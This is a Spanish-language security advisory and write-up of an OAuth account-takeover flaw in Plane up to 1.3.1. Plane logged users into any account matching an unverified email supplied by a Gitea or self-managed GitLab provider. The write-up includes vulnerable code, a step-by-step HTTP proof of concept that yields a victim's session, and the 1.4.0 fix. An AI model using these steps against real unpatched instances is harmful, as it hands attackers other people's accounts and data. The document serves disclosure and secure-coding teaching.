# CVE-2026-105640: Plane te loguea en cualquier cuenta cuyo email reclame tu proveedor OAuth

**Publicado:** 2026-10-05 **Reportado:** 2026-05-23 **Severidad:** 9.1 Crítica **Estado:** Corregido en Plane 1.4.0 (GHSA-7j95-vh8g-f365) **CWEs:** CWE-290 (Authentication Bypass by Spoofing) + CWE-287 (Improper Authentication)

---

El login OAuth de Plane toma el string de email de la respuesta userinfo del proveedor y busca una cuenta local con `User.objects.filter(email=email).first()`. Si vuelve una fila, ese usuario queda logueado. Nada en el camino chequea si el proveedor dijo que el email estaba verificado, ni chequea si la cuenta matcheada tuvo alguna vez relación con OAuth. En una instancia configurada con Gitea, donde una cuenta auto-registrada puede llevar cualquier email que escribas, un atacante que conoce el email de una víctima se loguea en la cuenta de Plane de esa víctima. La contraseña de la víctima nunca entra en juego. Asignado CVE-2026-105640, rateado Crítico en 9.1, corregido en Plane 1.4.0.

---

## Dónde se pierde la confianza

`apps/api/plane/authentication/adapter/base.py`, en `complete_login_or_signup`, tal como estaba en v1.3.1:

```python
def complete_login_or_signup(self):
    email = self.user_data.get("email")
    email = self.sanitize_email(email)          # solo valida formato
    user = User.objects.filter(email=email).first()
    is_signup = bool(user)
    if not user:
        ...                                     # rama de usuario nuevo
    ...
    user = self.save_user_data(user=user)       # loguea la cuenta matcheada
```

`sanitize_email` valida la forma del string, no su procedencia. El lookup matchea por el string y nada más. No se consulta ningún claim `email_verified` en ningún punto de este path, y no hay chequeo de que la fila encontrada se haya creado por OAuth y no por signup con contraseña. Una cuenta con contraseña y una cuenta OAuth se loguean igual.

Ese es el bug completo, y vive una capa más abajo que cualquier proveedor puntual. Que sea alcanzable depende de si el proveedor configurado le entrega a Plane un email elegido por el atacante.

El proveedor de Gitea se lo entrega. `apps/api/plane/authentication/provider/oauth/gitea.py`:

```python
def set_user_data(self):
    user_info_response = self.get_user_response()
    ...
    email = user_info_response.get("email")     # email del perfil, se toma primero
    if not email:
        email = self.__get_email(headers=headers)
    super().set_user_data({"email": email, ...})
```

Existe un helper `__get_email` que recorre `/api/v1/user/emails` y prefiere la dirección primaria y verificada. Es el fallback. El email del perfil de `GET /api/v1/user` se toma primero, y en cualquier cuenta normal ese campo viene lleno, así que el path verificado nunca corre.

Entre los cuatro proveedores que shippea Plane:

| Proveedor | Fuente del email | Chequeo de verificado | Afectado |
|---|---|---|---|
| Gitea | email del perfil, tomado primero | ninguno sobre ese campo | sí, con config default de Gitea |
| GitLab | email de `/api/v4/user` | ninguno | self-managed con confirmación apagada; gitlab.com verifica |
| GitHub | email primario | ninguno en el código, pero github.com fuerza primario igual a verificado | no en github.com |
| Google | email de userinfo | ninguno en el código, Google verifica | no en Google |

GitHub y Google están a salvo por accidente, no por diseño. Plane tampoco chequea el flag para ellos; simplemente esos proveedores nunca emiten una dirección sin verificar. Esa distinción importa, porque significa que la seguridad de una instancia de Plane depende de una propiedad del proveedor de identidad que Plane nunca verifica y de la que el operador puede no saber que está dependiendo.

## Gitea entrega el email que escribas

La mitad de Plane solo importa si la mitad del proveedor es real, así que lo chequeé contra un Gitea 1.21 de fábrica con su postura default: `REGISTER_EMAIL_CONFIRM=false`, mailer deshabilitado, registro abierto. Sin acceso de admin, sin cambios de configuración.

```console
POST /user/sign_up          (formulario público, sin admin)
user_name=attacker2 & email=victim2@corp.test & password=... & retype=...

HTTP/1.1 303 See Other
```

La cuenta queda activa de inmediato. Después, el endpoint exacto que lee Plane:

```console
GET /api/v1/user
Authorization: Basic attacker2:...

HTTP/1.1 200 OK
{"id":1,"login":"attacker2","email":"victim2@corp.test","active":true, ...}
```

Gitea devuelve la dirección que el atacante escribió en un formulario de registro, sin verificación de ningún tipo, por el campo que Plane consume primero. Gitea self-hosted con el mail apagado es una forma común de correr Gitea, que es lo que hace que este sea el caso de configuración default y no un edge case de hardening.

## PoC

La víctima `bob@plane.test` es una cuenta con contraseña creada independientemente en Plane, id `36e49693-873d-4408-9640-fb75722dbbba`. El atacante no tiene cuenta en Plane y no conoce la contraseña de Bob. El atacante controla una identidad de Gitea cuyo campo email es la dirección de Bob.

**Paso 1.** El atacante arranca el OAuth de Gitea en Plane:

```console
GET /auth/gitea/

HTTP/1.1 302 Found
Location: http://<gitea-host>/login/oauth/authorize?client_id=...&scope=openid+email+profile
          &redirect_uri=http%3A%2F%2Flocalhost%3A18080%2Fauth%2Fgitea%2Fcallback%2F
          &response_type=code&state=c4a3350b9d8443a59aa42052e50cbaa4
```

**Paso 2.** El atacante vuelve al callback con ese state. Plane hace el intercambio de token server-to-server, lee `GET /api/v1/user`, recibe `bob@plane.test`, y matchea la fila local existente:

```console
GET /auth/gitea/callback/?code=anyauthcode&state=c4a3350b9d8443a59aa42052e50cbaa4
Cookie: <sesión del atacante>

HTTP/1.1 302 Found
Set-Cookie: session-id=<emitida por Plane>
```

**Paso 3.** De quién es la sesión:

```console
GET /api/users/me/
Cookie: session-id=<del paso 2>

HTTP/1.1 200 OK
{"id":"36e49693-873d-4408-9640-fb75722dbbba","display_name":"bob","email":"bob@plane.test",
 "is_email_verified":true,"is_password_autoset":false,"last_login_medium":"gitea"}
```

Dos campos de esa respuesta cargan el hallazgo. `is_password_autoset:false` significa que Bob es una cuenta con contraseña preexistente, no una que Plane creó durante un signup por OAuth. `last_login_medium:gitea` significa que la sesión se emitió por el path de OAuth. Juntos: una cuenta que tiene su propia contraseña se le acaba de entregar a alguien que nunca la proporcionó.

## Impacto

En una instancia de Plane configurada con OAuth de Gitea, o de GitLab self-managed sin confirmación de email, cualquiera que pueda registrarse en el proveedor se queda con cualquier cuenta de Plane cuyo email conozca. Las direcciones de email se conocen de rutina, se publican en commits, o se enumeran sin esfuerzo. El atacante cae en la sesión de la víctima con acceso completo a sus workspaces, projects y datos. Apuntalo a un owner o admin de workspace y el workspace se va con eso.

Notá también lo que no hace falta: ninguna cuenta en Plane, ningún privilegio dentro de Plane, ninguna interacción de la víctima, ningún race, y ninguna posición en la red. La cuenta del proveedor no es un privilegio de Plane.

**CVSS 3.1:** 9.1 Crítica, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`.

`AC:L` es la métrica que más vale la pena defender, porque la objeción obvia es que el proveedor afectado es una precondición. Lo es, y está declarada como la configuración afectada en vez de metida dentro de la complejidad del ataque. Dentro de esa configuración el ataque no tiene race, no tiene man in the middle, y no requiere preparación del objetivo más allá de lo que el atacante ya controla. En un Gitea default el atacante se auto-registra con la dirección de la víctima y el primer intento funciona. `A:N` porque perder los datos de la víctima es una consecuencia derivada del impacto de integridad, no un impacto primario aparte.

Afectados: Plane `<= 1.3.1`, confirmado en v1.2.3, mismo código en v1.3.1 y en `preview` HEAD `039d582`.

## Fix

El reporte sugería arreglar las dos capas: llevar la señal de verificación del proveedor hasta `user_data` y rechazar los logins que no la traigan, y por separado negarse a loguear en una cuenta local preexistente vía OAuth salvo que esa cuenta se haya creado por OAuth o que el proveedor haya afirmado un email verificado que matchee.

Plane 1.4.0 lo arregló en el proveedor, lo que cierra el path alcanzable:

```python
def set_user_data(self):
    user_info_response = self.get_user_response()
    ...
    # Always use __get_email() which enforces the verified-email requirement.
    # The user object's .email field carries no verification flag, so it cannot
    # be trusted directly (GHSA-7j95-vh8g-f365).
    email = self.__get_email(headers=headers)
```

El campo de perfil sin verificar desapareció y el helper de primario-y-verificado ahora es la única fuente. La cuenta de Gitea auto-registrada de un atacante ya no produce un email usable para Plane, así que el match en `complete_login_or_signup` nunca ocurre.

Es la decisión correcta para shippear un fix rápido, y vale ser preciso sobre qué cubre y qué no. El comportamiento de match por email en `base.py` sigue igual: Plane todavía loguea a un caller en una cuenta con contraseña preexistente por coincidencia de string de email, y sigue sin tener un gate propio de `email_verified`. La defensa ahora descansa en que cada implementación de proveedor haga bien su propia verificación. Los tres proveedores existentes la hacen, después de este cambio. Un quinto proveedor agregado más adelante tendría que acordarse, y nada en el path de código compartido lo va a atajar si no se acuerda.

Corregido en Plane 1.4.0, publicado el 2026-07-31.

## Disclosure

| Fecha        | Evento                                                       |
|--------------|---------------------------------------------------------------|
| 2026-05-23   | Revisada la superficie OAuth, explotado de punta a punta en CE v1.2.3, alcanzabilidad confirmada contra un Gitea 1.21 de fábrica |
| 2026-05-23   | Reportado vía GitHub Security Advisory                        |
| 2026-07-31   | El fix sale en Plane 1.4.0                                    |
| 2026-08-03   | Publicado GHSA-7j95-vh8g-f365, asignado CVE-2026-105640       |

## Takeaways

"Logueá al usuario si el email matchea" es una línea de código que se ve razonable, y es razonable exactamente cuando el email es prueba de control del buzón. El userinfo de OAuth no es esa prueba salvo que el proveedor diga que lo es, que es para lo que existe el claim `email_verified` y por lo que OIDC lo especifica.

Lo que hace fácil shippear esta clase es que testea limpio contra todos los proveedores que un dev probablemente pruebe. github.com y Google no te van a dar una dirección sin verificar, así que un dev que desarrolla y testea contra ellos nunca va a ver la falla, y el chequeo faltante no deja rastro en el flujo que funciona. El bug recién aparece cuando un operador apunta el mismo código a un proveedor con otras garantías, que es una decisión de configuración tomada mucho después de escribir el código, por alguien que no tiene por qué saber que el chequeo se salteó.

Así que la pregunta a hacerle a cualquier login que matchee por email no es "¿esto funciona?" sino "¿cuál es el proveedor más débil al que esto puede apuntarse, y el código sobrevive a eso?". Acá el proveedor más débil es cualquier Gitea self-hosted con el mail apagado, que es una forma normal de correr Gitea.

## Links

- Advisory: https://github.com/makeplane/plane/security/advisories/GHSA-7j95-vh8g-f365
- Registro CVE: https://www.cve.org/CVERecord?id=CVE-2026-105640
- Plane: https://github.com/makeplane/plane
- El claim `email_verified` (OIDC Core, sección 5.1): https://openid.net/specs/openid-connect-core-1_0.html#StandardClaims
- CWE-290: https://cwe.mitre.org/data/definitions/290.html
- CWE-287: https://cwe.mitre.org/data/definitions/287.html
